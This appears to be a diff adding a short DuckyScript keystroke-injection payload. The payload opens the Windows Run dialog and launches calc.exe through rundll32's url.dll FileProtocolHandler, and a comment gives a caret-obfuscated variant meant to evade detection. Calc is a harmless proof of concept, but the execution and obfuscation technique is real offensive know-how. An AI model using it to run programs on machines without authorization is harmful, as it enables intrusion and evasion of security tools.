@@ -1,0 +1,7 @@
+REM By JOB
+REM Launch an executable by calling FileProtocolHandler.
+GUI r
+DEFAULT_DELAY 350
+STRING rundll32.exe url.dll,FileProtocolHandler C:\Windows\System32\calc.exe
+REM obfuscated ver: rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
+ENTER
